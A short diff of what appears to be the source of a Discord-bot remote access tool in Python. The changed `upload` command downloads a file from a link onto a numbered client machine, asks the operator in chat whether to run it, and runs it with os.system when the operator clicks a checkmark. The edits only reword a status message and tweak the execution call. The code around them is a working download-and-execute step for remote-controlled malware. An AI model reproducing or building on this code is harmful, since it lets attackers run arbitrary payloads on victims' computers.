@@ -273,7 +273,7 @@ async def upload(ctx, inputid, dwnldlink, filetype): ### PUT FILE TYPES LIKE .pn
         fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
         open(fname, 'wb').write(r.content)
         emojis = ['✅', '❌']
-        msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
+        msg = await ctx.send(f'Uploaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
         for emoji in emojis:
             await msg.add_reaction(emoji)
         @bot.event
@@ -283,7 +283,7 @@ async def upload(ctx, inputid, dwnldlink, filetype): ### PUT FILE TYPES LIKE .pn
                 return
             if emoji == '✅':
                 try:
-                    os.system(fname)
+                    os.system('call '+fname)
                     await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
                 except Exception:
                     await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
